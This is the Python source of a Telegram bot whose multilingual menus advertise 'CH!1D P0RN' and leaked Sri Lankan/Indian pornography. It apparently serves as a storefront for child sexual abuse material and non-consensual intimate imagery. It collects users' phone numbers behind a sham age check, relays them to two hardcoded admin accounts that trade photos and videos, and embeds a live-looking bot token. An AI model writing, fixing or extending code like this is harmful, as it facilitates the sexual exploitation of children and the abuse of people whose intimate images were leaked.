import logging
import os
import re
import unicodedata
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackContext,
    filters,
)
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, OperationFailure

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Define states for the conversation handler
PHONE_REQUEST, LANGUAGE_SELECTION, MAIN_MENU, CATEGORY_REDIRECTION = range(4)

# MongoDB setup
MONGO_URI = os.getenv("MONGO_URI", "YOUR_MONGODB_ATLAS_CONNECTION_STRING")
try:
    client = MongoClient(MONGO_URI)
    client.admin.command('ping')
    db = client['telegram_bot']
    users_collection = db['users']  # Store user data: user_id, phone, language, chat_id
    active_chats_collection = db['active_chats']  # Store active user-admin pairs
except (ConnectionFailure, OperationFailure) as e:
    logger.error(f"MongoDB connection failed: {e}")
    raise Exception("Failed to connect to MongoDB. Check MONGO_URI credentials and network settings.")

# Admin IDs (replace with your two actual admin Telegram chat IDs)
admin_ids = [6581573267, 7827015238]  # Replace with your actual admin IDs

# Custom filter for multiple admin IDs
class AdminFilter(filters.MessageFilter):
    def filter(self, update: Update) -> bool:
        return update.effective_user.id in admin_ids

# Menu texts for each language
MENUS = {
    'en': {
        'welcome': "Welcome to our bot! Please choose a category or exit.",
        'category1': "Sri Lankan/Indian Leak P0RN",
        'category2': "CH!1D P0RN",
        'exit': "Exit",
        'admin_message': "New user chat initiated.\nUser phone: `{phone}`\nUser ID: `{user_id}`",
        'chat_closed': "Chat has been closed by admin.",
        'select_language': "Please select your language:",
        'phone_prompt': "ONLY 18+ ADULTS ALLOWED TO JOIN THIS NETWORK.",
        'phone_denied': "YOU MUST ALLOW TO SHARE YOUR AGE TO JOIN THIS NETWORK. Please try again with /start..",
        'share_button': "IAM 18+ ADULT",
        'db_error': "Sorry, we're experiencing database issues. Please try again later."
    },
    'si': {
        'welcome': "අපගේ බොට් වෙත සාදරයෙන් පිළිගනිමු! කරුණාකර කාණ්ඩයක් තෝරන්න හෝ පිටවන්න.",
        'category1': "‍‍ලංකාවේ/ඉන්දියාවේ ලීක් වීඩියෝ ",
        'category2': "ළමා වීඩියෝ",
        'exit': "පිටවීම",
        'admin_message': "නව පරිශීලක චැට් ආරම්භ විය.\nපරිශීලක දුරකථනය: `{phone}`\nUser ID: `{user_id}`",
        'chat_closed': "චැට් ඇඩ්මින් විසින් වසා ඇත.",
        'select_language': "කරුණාකර ඔබේ භාෂාව තෝරන්න:",
        'phone_prompt': "ඉදිරියට යාම, වයස 18+ වැඩිහිටියන්ට පමණකි.",
        'phone_denied': "ඔබ ඉදිරියට යාමට ඔබගේ සත්‍ය වයස අප හා බෙදාගැනීමට එකඟ වියයුතුමය. කරුණාකර /start සමඟ නැවත උත්සාහ කරන්න.",
        'share_button': "මම 18+ වැඩිහිටියෙක්මි",
        'db_error': "කණගාටුයි, අපට දත්ත සමුදා ගැටළු ඇත. කරුණාකර පසුව නැවත උත්සාහ කරන්න."
    },
    'hi': {
        'welcome': "हमारे बॉट में आपका स्वागत है! कृपया एक श्रेणी चुनें या बाहर निकलें।",
        'category1': "Sri Lankan/Indian Leak P0RN",
        'category2': "बच्चों के वीडियो",
        'exit': "बाहर निकलें",
        'admin_message': "नया उपयोगकर्ता चैट शुरू हुआ।\nउपयोगकर्ता फोन: `{phone}`\nUser ID: `{user_id}`",
        'chat_closed': "चैट को व्यवस्थापक द्वारा बंद कर दिया गया है।",
        'select_language': "कृपया अपनी भाषा चुनें:",
        'phone_prompt': "कार्यवाही केवल 18+ आयु वर्ग के वयस्कों के लिए है।",
        'phone_denied': "जारी रखने के लिए आपको अपनी वास्तविक आयु हमसे साझा करने की सहमति देनी होगी। कृपया /start के साथ पुनः प्रयास करें",
        'share_button': "मैं 18+ आयु का वयस्क हूं।",
        'db_error': "क्षमा करें, हमें डेटाबेस समस्याएँ आ रही हैं। कृपया बाद में पुनः प्रयास करें।"
    }
}

# Language options
LANGUAGES = {
    'en': 'English',
    'si': 'Sinhala',
    'hi': 'Hindi'
}

async def start(update: Update, context: CallbackContext) -> int:
    """Start the bot and present a 'Share My Phone Number' button."""
    user_id = update.effective_user.id
    context.user_data.clear()
    logger.info(f"User {user_id} triggered /start")
    
    try:
        users_collection.update_one(
            {'user_id': user_id},
            {'$setOnInsert': {'chat_id': update.effective_chat.id}},
            upsert=True
        )
        keyboard = [[KeyboardButton(MENUS['en']['share_button'], request_contact=True)]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text(MENUS['en']['phone_prompt'], reply_markup=reply_markup)
        return PHONE_REQUEST
    except OperationFailure as e:
        logger.error(f"MongoDB operation failed in start for user {user_id}: {e}")
        for admin_id in admin_ids:
            try:
                await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
        await update.message.reply_text(MENUS['en']['db_error'])
        return ConversationHandler.END

async def receive_phone(update: Update, context: CallbackContext) -> int:
    """Handle the phone number received from the Telegram popup."""
    user_id = update.effective_user.id
    contact = update.message.contact
    logger.info(f"User {user_id} shared phone number")
    
    if contact and contact.phone_number:
        try:
            # Delete the contact message if possible
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
                logger.info(f"Deleted contact message for user {user_id}")
            except Exception as e:
                logger.warning(f"Failed to delete contact message for user {user_id}: {e}")
            
            users_collection.update_one(
                {'user_id': user_id},
                {'$set': {'phone': contact.phone_number}}
            )
            keyboard = [[lang] for lang in LANGUAGES.values()]
            reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
            await update.message.reply_text(MENUS['en']['select_language'], reply_markup=reply_markup)
            return LANGUAGE_SELECTION
        except OperationFailure as e:
            logger.error(f"MongoDB operation failed in receive_phone for user {user_id}: {e}")
            for admin_id in admin_ids:
                try:
                    await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
                except Exception as admin_error:
                    logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
            await update.message.reply_text(MENUS['en']['db_error'])
            return ConversationHandler.END
    else:
        await update.message.reply_text(MENUS['en']['phone_denied'], reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END

async def select_language(update: Update, context: CallbackContext) -> int:
    """Handle language selection and show main menu."""
    user_id = update.effective_user.id
    selected_lang = update.message.text
    lang_code = next((code for code, name in LANGUAGES.items() if name.lower() == selected_lang.lower()), None)
    
    if lang_code not in LANGUAGES:
        await update.message.reply_text("Invalid language. Please select a valid language.")
        return LANGUAGE_SELECTION
    
    try:
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'language': lang_code}}
        )
        menu = MENUS[lang_code]
        keyboard = [[menu['category1'], menu['category2']], [menu['exit']]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text(menu['welcome'], reply_markup=reply_markup)
        logger.info(f"User {user_id} selected language {lang_code}, menu options: {[menu['category1'], menu['category2'], menu['exit']]}")
        return MAIN_MENU
    except OperationFailure as e:
        logger.error(f"MongoDB operation failed in select_language for user {user_id}: {e}")
        for admin_id in admin_ids:
            try:
                await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
        await update.message.reply_text(MENUS[lang_code]['db_error'])
        return ConversationHandler.END

async def main_menu(update: Update, context: CallbackContext) -> int:
    """Handle main menu options: redirect to admin or exit."""
    user_id = update.effective_user.id
    choice = update.message.text
    # Normalize input to handle encoding/whitespace issues
    choice_normalized = unicodedata.normalize('NFKC', choice.strip())
    logger.info(f"User {user_id} selected: '{choice}' (normalized: '{choice_normalized}')")
    
    try:
        user = users_collection.find_one({'user_id': user_id})
        if not user or 'language' not in user:
            await update.message.reply_text("Please start again with /start.")
            return ConversationHandler.END
        
        lang = user['language']
        menu = MENUS[lang]
        # Normalize menu options for comparison
        valid_options = [
            unicodedata.normalize('NFKC', menu['category1'].strip()),
            unicodedata.normalize('NFKC', menu['category2'].strip()),
            unicodedata.normalize('NFKC', menu['exit'].strip())
        ]
        logger.info(f"Valid options for lang {lang}: {valid_options}")
        
        if choice_normalized == unicodedata.normalize('NFKC', menu['exit'].strip()):
            await update.message.reply_text("Thank you for using our bot!", reply_markup=ReplyKeyboardRemove())
            return ConversationHandler.END
        
        if choice_normalized in [unicodedata.normalize('NFKC', menu['category1'].strip()), unicodedata.normalize('NFKC', menu['category2'].strip())]:
            admin_id = admin_ids[user_id % len(admin_ids)]
            active_chats_collection.update_one(
                {'user_id': user_id},
                {'$set': {'admin_id': admin_id}},
                upsert=True
            )
            admin_message = menu['admin_message'].format(phone=user['phone'], user_id=user_id)
            await context.bot.send_message(chat_id=admin_id, text=admin_message)
            await update.message.reply_text(f"You selected {choice}. An admin will assist you shortly.", reply_markup=ReplyKeyboardRemove())
            return CATEGORY_REDIRECTION
        else:
            await update.message.reply_text("Please select a valid option.")
            logger.warning(f"Invalid option selected by user {user_id}: '{choice_normalized}' not in {valid_options}")
            return MAIN_MENU
    except OperationFailure as e:
        logger.error(f"MongoDB operation failed in main_menu for user {user_id}: {e}")
        for admin_id in admin_ids:
            try:
                await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
        await update.message.reply_text(MENUS['en']['db_error'])
        return ConversationHandler.END

async def forward_to_admin(update: Update, context: CallbackContext) -> None:
    """Forward user messages to the assigned admin."""
    user_id = update.effective_user.id
    logger.info(f"Forwarding message from user {user_id}")
    
    try:
        active_chat = active_chats_collection.find_one({'user_id': user_id})
        if active_chat:
            admin_id = active_chat['admin_id']
            user = users_collection.find_one({'user_id': user_id})
            if update.message.text:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"From user: `{user['phone']}`\nMessage: {update.message.text}\nID: `{user_id}`"
                )
            elif update.message.photo:
                await context.bot.send_photo(
                    chat_id=admin_id,
                    photo=update.message.photo[-1].file_id,
                    caption=f"From user: `{user['phone']}`\nID: `{user_id}`"
                )
            elif update.message.video:
                await context.bot.send_video(
                    chat_id=admin_id,
                    video=update.message.video.file_id,
                    caption=f"From user: `{user['phone']}`\nID: `{user_id}`"
                )
        else:
            await update.message.reply_text("No active admin session. Please select a category from the main menu.")
            logger.info(f"No active chat for user {user_id}, prompted to return to main menu")
    except OperationFailure as e:
        logger.error(f"MongoDB operation failed in forward_to_admin for user {user_id}: {e}")
        for admin_id in admin_ids:
            try:
                await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
        await update.message.reply_text(MENUS['en']['db_error'])

async def admin_reply(update: Update, context: CallbackContext) -> None:
    """Handle admin replies (via /reply or direct reply to user messages)."""
    admin_id = update.effective_user.id
    if admin_id not in admin_ids:
        logger.info(f"Non-admin {admin_id} attempted to use admin_reply")
        return
    
    logger.info(f"Admin {admin_id} triggered admin_reply")
    try:
        if update.message.reply_to_message:
            replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            logger.info(f"Replied-to message text: {replied_text}")
            user_id_match = re.search(r"ID: `(\d+)`", replied_text)
            if not user_id_match:
                logger.warning(f"Failed to extract user_id from replied message: {replied_text}")
                await update.message.reply_text("Could not identify user. Please use /reply <user_id> <message>.")
                return
            user_id = int(user_id_match.group(1))
            message = update.message.text if update.message.text else ""
            logger.info(f"Extracted user_id: {user_id}, message: {message}")
        elif context.args:
            try:
                user_id = int(context.args[0])
                message = ' '.join(context.args[1:]) if len(context.args) > 1 else ""
                logger.info(f"Handling /reply command: user_id={user_id}, message={message}")
            except (IndexError, ValueError):
                await update.message.reply_text("Invalid format. Use: /reply <user_id> <message>")
                return
        else:
            await update.message.reply_text("Please reply to a user message or use: /reply <user_id> <message>")
            return
        
        user = users_collection.find_one({'user_id': user_id})
        active_chat = active_chats_collection.find_one({'user_id': user_id})
        if not user or not active_chat:
            logger.warning(f"No user or active chat found for user_id {user_id}")
            await update.message.reply_text("Invalid user ID or no active chat.")
            return
        
        if message.lower() == "close":
            lang = user['language']
            await context.bot.send_message(chat_id=user['chat_id'], text=MENUS[lang]['chat_closed'])
            active_chats_collection.delete_one({'user_id': user_id})
            await update.message.reply_text("Chat closed.")
            logger.info(f"Chat closed for user {user_id} by admin {admin_id}")
            return
        
        if update.message.text:
            await context.bot.send_message(chat_id=user['chat_id'], text=message)
        elif update.message.photo:
            await context.bot.send_photo(chat_id=user['chat_id'], photo=update.message.photo[-1].file_id)
        elif update.message.video:
            await context.bot.send_video(chat_id=user['chat_id'], video=update.message.video.file_id)
        await update.message.reply_text(f"Message sent to user {user_id}.")
        logger.info(f"Message sent to user {user_id} by admin {admin_id}")
    except OperationFailure as e:
        logger.error(f"MongoDB operation failed in admin_reply for user {user_id}: {e}")
        for admin_id in admin_ids:
            try:
                await context.bot.send_message(chat_id=admin_id, text=f"Database error for user {user_id}: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
        await update.message.reply_text("Invalid format or database error. Use: /reply <user_id> <message>")

async def error_handler(update: Update, context: CallbackContext) -> None:
    """Log errors caused by updates."""
    logger.error(f"Update {update} caused error {context.error}")

def main() -> None:
    """Run the bot."""
    bot_token = "8238624662:AAFjN4y4w7ehftkxZTTuuK3E5qxbiSf2FW8"
    application = Application.builder().token(bot_token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE_REQUEST: [MessageHandler(filters.CONTACT, receive_phone)],
            LANGUAGE_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, select_language)],
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu)],
            CATEGORY_REDIRECTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, forward_to_admin),
                MessageHandler(filters.PHOTO, forward_to_admin),
                MessageHandler(filters.VIDEO, forward_to_admin),
            ],
        },
        fallbacks=[CommandHandler('start', start)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('reply', admin_reply))
    application.add_handler(MessageHandler((filters.TEXT | filters.PHOTO | filters.VIDEO) & AdminFilter() & filters.REPLY, admin_reply))
    application.add_error_handler(error_handler)

    try:
        application.run_polling()
    except Exception as e:
        logger.error(f"Application failed to start: {e}")
        for admin_id in admin_ids:
            try:
                application.bot.send_message(chat_id=admin_id, text=f"Bot failed to start: {str(e)}")
            except Exception as admin_error:
                logger.error(f"Failed to notify admin {admin_id}: {admin_error}")
    finally:
        client.close()

if __name__ == '__main__':
    main()
